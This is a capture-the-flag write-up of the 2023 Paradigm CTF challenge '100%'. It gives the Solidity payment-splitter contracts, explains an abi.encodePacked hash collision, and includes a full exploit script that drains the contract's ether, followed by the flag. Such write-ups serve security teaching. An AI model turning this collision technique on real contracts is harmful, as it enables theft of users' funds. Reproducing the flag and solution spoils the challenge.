---
title: Blockchain - 100%
description: 2023 | Paradigm CTF | PWN
tags:
    - smart contract
    - abi.encodePacked
    - collisions
---

## Description

Your funds are safe when you use our innovative new payment splitter that ensure that 100% of assets make it to their intended recipients.

??? note "Deploy.s.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import "forge-ctf/CTFDeployment.sol";

    import "src/Split.sol";
    import "src/Challenge.sol";

    contract Deploy is CTFDeployment {
        function deploy(address system, address) internal override returns (address challenge) {
            vm.startBroadcast(system);

            Split split = new Split();

            address[] memory addrs = new address[](2);
            addrs[0] = address(0x000000000000000000000000000000000000dEaD);
            addrs[0] = address(0x000000000000000000000000000000000000bEEF);
            uint32[] memory percents = new uint32[](2);
            percents[0] = 5e5;
            percents[1] = 5e5;

            uint256 id = split.createSplit(addrs, percents, 0);

            Split.SplitData memory splitData = split.splitsById(id);
            splitData.wallet.deposit{value: 100 ether}();

            challenge = address(new Challenge(split));

            vm.stopBroadcast();
        }
    }
    ```

??? note "src/Challenge.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
    import "./Split.sol";

    contract Challenge {
        Split public immutable SPLIT;

        constructor(Split split) {
            SPLIT = split;
        }

        function isSolved() external view returns (bool) {
            Split.SplitData memory splitData = SPLIT.splitsById(0);

            return address(SPLIT).balance == 0 && address(splitData.wallet).balance == 0;
        }
    }
    ```

??? note "src/Split.sol"

    ```js
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
    import "@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol";

    import "./SplitWallet.sol";

    contract Split is ERC721("Split", "SPLIT") {
        using ClonesWithImmutableArgs for address;

        struct SplitData {
            bytes32 hash;
            SplitWallet wallet;
        }

        SplitWallet private immutable IMPLEMENTATION = new SplitWallet();
        uint256 private immutable SCALE = 1e6;

        uint256 public nextId;

        mapping(uint256 => SplitData) private _splitsById;

        mapping(address => mapping(address => uint256)) public balances;

        modifier onlySplitOwner(uint256 splitId) {
            _onlySplitOwner(splitId);
            _;
        }

        function _onlySplitOwner(uint256 splitId) private view {
            require(msg.sender == ownerOf(splitId), "NOT_SPLIT_OWNER");
        }

        modifier validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) {
            _validSplit(accounts, percents, relayerFee);
            _;
        }

        function _validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) private pure {
            require(accounts.length == percents.length, "MISMATCH_LENGTH");

            uint256 sum;
            for (uint256 i = 0; i < accounts.length; i++) {
                sum += percents[i];
            }

            require(sum == SCALE, "INVALID_PERCENTAGES");

            require(relayerFee < SCALE / 10, "INVALID_RELAYER_FEE");
        }

        function createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
            external
            returns (uint256)
        {
            return _createSplit(accounts, percents, relayerFee, msg.sender);
        }

        function createSplitFor(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
            external
            returns (uint256)
        {
            return _createSplit(accounts, percents, relayerFee, owner);
        }

        function _createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
            private
            validSplit(accounts, percents, relayerFee)
            returns (uint256)
        {
            uint256 tokenId = nextId++;

            address wallet = address(IMPLEMENTATION).clone(abi.encodePacked(address(this)));

            _splitsById[tokenId] =
                SplitData({hash: _hashSplit(accounts, percents, relayerFee), wallet: SplitWallet(payable(wallet))});

            _mint(owner, tokenId);

            return tokenId;
        }

        function updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
            external
        {
            _updateSplit(splitId, accounts, percents, relayerFee);
        }

        function updateSplitAndDistribute(
            uint256 splitId,
            address[] memory accounts,
            uint32[] memory percents,
            uint32 relayerFee,
            IERC20 token
        ) external {
            _updateSplit(splitId, accounts, percents, relayerFee);
            _distribute(splitId, accounts, percents, relayerFee, token);
        }

        function distribute(
            uint256 splitId,
            address[] memory accounts,
            uint32[] memory percents,
            uint32 relayerFee,
            IERC20 token
        ) external {
            _distribute(splitId, accounts, percents, relayerFee, token);
        }

        function withdraw(IERC20[] calldata tokens, uint256[] calldata amounts) external {
            for (uint256 i = 0; i < tokens.length; i++) {
                IERC20 token = tokens[i];
                uint256 amount = amounts[i];

                balances[msg.sender][address(token)] -= amount;

                if (address(token) == address(0x00)) {
                    payable(msg.sender).transfer(amount);
                } else {
                    token.transfer(msg.sender, amount);
                }
            }
        }

        function _updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
            private
            onlySplitOwner(splitId)
            validSplit(accounts, percents, relayerFee)
        {
            _splitsById[splitId].hash = _hashSplit(accounts, percents, relayerFee);
        }

        function _distribute(
            uint256 splitId,
            address[] memory accounts,
            uint32[] memory percents,
            uint32 relayerFee,
            IERC20 token
        ) private {
            require(_splitsById[splitId].hash == _hashSplit(accounts, percents, relayerFee));

            SplitWallet wallet = _splitsById[splitId].wallet;
            uint256 storedWalletBalance = balances[address(wallet)][address(token)];
            uint256 externalWalletBalance = wallet.balanceOf(token);

            uint256 totalBalance = storedWalletBalance + externalWalletBalance;

            if (msg.sender != ownerOf(splitId)) {
                uint256 relayerAmount = totalBalance * relayerFee / SCALE;
                balances[msg.sender][address(token)] += relayerAmount;
                totalBalance -= relayerAmount;
            }

            for (uint256 i = 0; i < accounts.length; i++) {
                balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE;
            }

            if (storedWalletBalance > 0) {
                balances[address(wallet)][address(token)] = 0;
            }

            if (externalWalletBalance > 0) {
                wallet.pullToken(token, externalWalletBalance);
            }
        }

        function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
            internal
            pure
            returns (bytes32)
        {
            return keccak256(abi.encodePacked(accounts, percents, relayerFee));
        }

        function splitsById(uint256 id) external view returns (SplitData memory) {
            return _splitsById[id];
        }

        receive() external payable {}
    }
    ```

??? note "src/SplitWallet.sol"

    ```js
    import "@clones-with-immutable-args/src/Clone.sol";
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

    contract SplitWallet is Clone {
        function deposit() external payable {}

        function pullToken(IERC20 token, uint256 amount) external {
            require(msg.sender == _getArgAddress(0));

            if (address(token) == address(0x00)) {
                payable(msg.sender).transfer(amount);
            } else {
                token.transfer(msg.sender, amount);
            }
        }

        function balanceOf(IERC20 token) external view returns (uint256) {
            if (address(token) == address(0x00)) {
                return address(this).balance;
            }

            return token.balanceOf(address(this));
        }
    }
    ```

## Solution

- To solve the challenge, the ether balance of both `SPLIT` and `_splitsById[0].wallet` should be 0
- The `distribute()` function of `Split` can be used to distribute the specific asset in the `SplitWallet`, based on the `accounts` and `percents` that are specified during the creation of the `SplitWallet`. After distribution, users can withdraw based on the value stored in `balances`
- However, `distribute()` simply validates the parameters by comparing the hash of `abi.encodePacked` result, while both `accounts` and `percents` are dynamic types. Thus, `accounts` and `percents` can be slightly adjusted during distribution

    ```js
    function _distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) private {
        require(_splitsById[splitId].hash == _hashSplit(accounts, percents, relayerFee));
        ...
    }

    function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(accounts, percents, relayerFee));
    }
    ```

- During the creation of `SplitWallet{id: 0}`, index 1 account has been accidentally left uninitialized

    ```js
    address[] memory addrs = new address[](2);
    addrs[0] = address(0x000000000000000000000000000000000000dEaD);
    addrs[0] = address(0x000000000000000000000000000000000000bEEF);
    ...
    uint256 id = split.createSplit(addrs, percents, 0);
    ```

- So we can use modified `accounts` and `percents` to pull all ETH from `SplitWallet{id: 0}` but not distribute it to anyone, while keeping the hash unchanged (Note that array elements are padded to 32 bytes)

    ```js
    function _distribute(
        uint256 splitId,
        address[] memory accounts,  // @note [0xbEEF]
        uint32[] memory percents,   // @note [0, 5e5, 5e5]
        uint32 relayerFee,
        IERC20 token
    ) private {
        ...
        uint256 totalBalance = storedWalletBalance + externalWalletBalance;

        if (msg.sender != ownerOf(splitId)) {
            uint256 relayerAmount = totalBalance * relayerFee / SCALE;
            balances[msg.sender][address(token)] += relayerAmount;
            totalBalance -= relayerAmount;
        }

        for (uint256 i = 0; i < accounts.length; i++) {
            balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE;
        }
        ...
    }
    ```

- Similarly, we can utilize the hash collision caused by `abi.encodePacked` to withdraw more ETH than deposited to drain `Split`

### Exploit

```js
function solve(address challenge, address player) internal override {
    Challenge chall = Challenge(challenge);
    Split split = chall.SPLIT();

    address[] memory account = new address[](1);
    account[0] = address(0x000000000000000000000000000000000000bEEF);
    uint32[] memory percents = new uint32[](3);
    percents[1] = 5e5;
    percents[2] = 5e5;
    split.distribute(0, account, percents, 0, IERC20(address(0)));  // pull from SplitWallet

    address[] memory accounts = new address[](2);
    accounts[0] = player;
    accounts[1] = address(2 ** 32 - 1); // set percent to the max
    percents = new uint32[](2);
    percents[0] = 5e5;
    percents[1] = 5e5;
    split.createSplit(accounts, percents, 0);

    Split.SplitData memory splitData = split.splitsById(1);
    // x * (2 ** 32 - 1) / 1e6 > (100 ether + x) => x > 100 ether * 1e6 / (2 ** 32 - 1e6 - 1)
    splitData.wallet.deposit{value: 100 ether * 1e6 / uint256(2 ** 31)}();

    account[0] = player;
    percents = new uint32[](3);
    percents[0] = 2 ** 32 - 1;
    percents[1] = 5e5;
    percents[2] = 5e5;
    split.distribute(1, account, percents, 0, IERC20(address(0)));
    IERC20[] memory tokens = new IERC20[](1);
    tokens[0] = IERC20(address(0));
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = address(split).balance;
    split.withdraw(tokens, amounts);
    require(chall.isSolved());
}
```

### Flag

> PCTF{gU355_7H3r3_w45n7_3nOUgH_1NpU7_V4L1D471ON}
